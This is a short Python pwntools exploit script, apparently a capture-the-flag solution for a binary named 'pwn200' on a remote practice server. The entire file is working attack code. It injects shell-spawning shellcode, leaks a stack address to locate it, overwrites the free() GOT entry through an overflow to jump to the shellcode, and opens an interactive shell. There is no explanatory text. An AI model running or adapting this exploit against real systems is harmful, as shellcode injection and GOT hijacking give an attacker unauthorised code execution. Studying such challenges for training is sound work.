#!/usr/bin/env python

# -*- coding: utf-8 -*-

from pwn import *
context.arch = 'amd64'  
context.log_level = 'debug'
# p = process('./pwn200')
p = remote('node3.buuoj.cn',28152)
elf = ELF('./pwn200')
free_got = elf.got["free"]
#gdb.attach(p)
shellcode = asm(shellcraft.sh())
p.sendafter('u?\n',shellcode+"a"*(48-len(shellcode)))

ebp = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
log.success("ebp --->> "+hex(ebp))
offset = -0x50
shellcode_addr = ebp + offset
log.success("shellcode_addr --->> " + hex(shellcode_addr))
p.sendline('0') 

p.recvuntil('\n')

payload = p64(shellcode_addr)
p.send(payload + '\x00'*(0x38-len(payload)) + p64(free_got)) 
p.recvuntil('choice :')
p.sendline('2')
p.interactive()
